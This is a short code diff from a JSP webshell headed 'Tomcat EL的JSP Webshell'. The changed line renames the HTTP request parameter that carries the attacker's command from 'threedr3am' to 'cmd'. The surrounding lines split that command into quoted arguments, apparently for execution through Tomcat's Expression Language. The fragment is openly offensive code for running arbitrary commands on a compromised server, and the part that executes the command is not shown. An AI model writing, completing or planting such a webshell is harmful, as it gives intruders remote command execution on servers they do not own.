@@ -7,7 +7,7 @@
 <h2>Tomcat EL的JSP Webshell</h2>
 <%
     StringBuilder stringBuilder = new StringBuilder();
-    String cmd = request.getParameter("threedr3am");
+    String cmd = request.getParameter("cmd");
     for (String tmp:cmd.split(" ")) {
         stringBuilder.append("'").append(tmp).append("'").append(",");
     }
